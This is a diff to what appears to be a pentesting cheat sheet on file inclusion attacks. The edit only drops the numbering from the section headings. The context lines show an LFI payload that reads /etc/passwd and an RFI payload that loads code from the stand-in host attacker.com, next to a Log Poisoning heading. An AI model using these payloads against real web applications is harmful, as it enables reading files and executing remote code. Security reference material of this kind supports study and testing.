@@ -6,7 +6,7 @@ alts: [Directory-Traversal, Reverse-Shell]
 render_with_liquid: false
 ---
 
-## 1. Local File Inclusion (LFI)
+## Local File Inclusion (LFI)
 
 ```sh
 /index.php?page=/etc/passwd
@@ -38,7 +38,7 @@ render_with_liquid: false
 
 <br />
 
-## 2. Remote File Inclusion (RFI)
+## Remote File Inclusion (RFI)
 
 ```
 /index.php?page=//attacker.com/exploit
@@ -46,7 +46,7 @@ render_with_liquid: false
 
 <br />
 
-## 3. Log Poisoning
+## Log Poisoning
 
 1. **Check if You Can Access the Apache Log File**
 
